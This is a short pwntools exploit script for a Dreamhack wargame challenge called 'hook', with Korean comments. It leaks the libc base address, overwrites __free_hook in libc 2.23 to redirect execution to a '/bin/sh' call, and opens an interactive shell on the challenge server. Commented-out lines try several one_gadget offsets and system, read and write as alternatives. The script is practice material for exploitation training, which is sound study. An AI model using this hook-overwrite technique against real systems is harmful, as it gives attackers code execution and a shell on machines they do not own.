from pwn import *

context.arch = "amd64"

p = remote("host3.dreamhack.games", 17398)
elf = ELF("./hook")
libc = ELF("./libc-2.23.so")

# [1] Leak libc base
p.recvuntil(b"stdout: ")
libc_stdout = int(p.recvline()[:-1], 16)
libc_base = libc_stdout - libc.symbols["_IO_2_1_stdout_"]

free_hook = libc_base + libc.symbols["__free_hook"]
sh = 0x400a11  # mov rdi, 0x400aeb : "/bin/sh" 의 주소

p.sendline(str(16).encode())
p.send(p64(free_hook) + p64(sh))

# libc_system = libc_base + libc.symbols["system"]
# read = libc_base + libc.symbols["read"]
# write = libc_base + libc.symbols["write"]

# og = libc_base + 0x4527A  # [rsp+0x30] == NULL : 전부 조건을 만족하지 않는데, 이것만 실제 exploit이 됨
# og = libc_base + 0xf03a4  # [rsp+0x50] == NULL
# og = libc_base + 0xf1247 # [rsp+0x70] == NULL
# p.send(p64(free_hook) + p64(og))

# og대신 system, write, read는 인자를 설정해주지 않아도 왜 다 될까 ?
# p.send(p64(free_hook) + p64(system))
# p.send(p64(free_hook) + p64(write))
# p.send(p64(free_hook) + p64(read))

p.interactive()
